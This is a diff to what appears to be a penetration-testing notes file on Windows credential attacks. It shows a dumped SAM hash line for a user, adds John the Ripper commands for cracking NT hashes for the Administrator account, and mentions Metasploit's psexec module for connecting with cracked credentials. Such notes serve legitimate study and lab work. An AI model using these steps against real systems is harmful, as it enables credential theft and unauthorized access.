@@ -352,6 +352,14 @@ pete:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
 [*] Stopping service RemoteRegistry
 ```
 
+## Crack the Hash with John the Ripper
+for cracking the SAM hashes from above
+```
+john hash.txt -format=nt2 -users=Administrator
+cd .john
+cat john.pot
+```
+
 
 #### connecting: requires having cracked a hash
 1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
